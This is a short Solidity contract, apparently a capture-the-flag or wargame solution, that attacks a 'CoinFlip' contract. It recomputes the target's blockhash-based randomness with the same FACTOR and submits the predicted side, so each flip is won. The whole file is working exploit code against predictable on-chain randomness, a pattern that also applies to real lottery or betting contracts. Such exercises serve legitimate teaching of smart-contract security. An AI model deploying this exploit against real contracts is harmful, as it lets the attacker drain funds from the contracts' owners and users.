// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./coinFlip.sol";

/**
 * This contract will be used in order to return the result expected in the coin flip contract, using the same formula
 */
contract coinflipAttack {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public immutable target;
    constructor(address targetAddress) {
        target=CoinFlip(targetAddress);
    }

// returns the same result as flip, in order to be used as a guess in the CoinFlip contract
    function preflip() external returns (uint256){
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;

        target.flip(side);

        return target.consecutiveWins();
    }
}
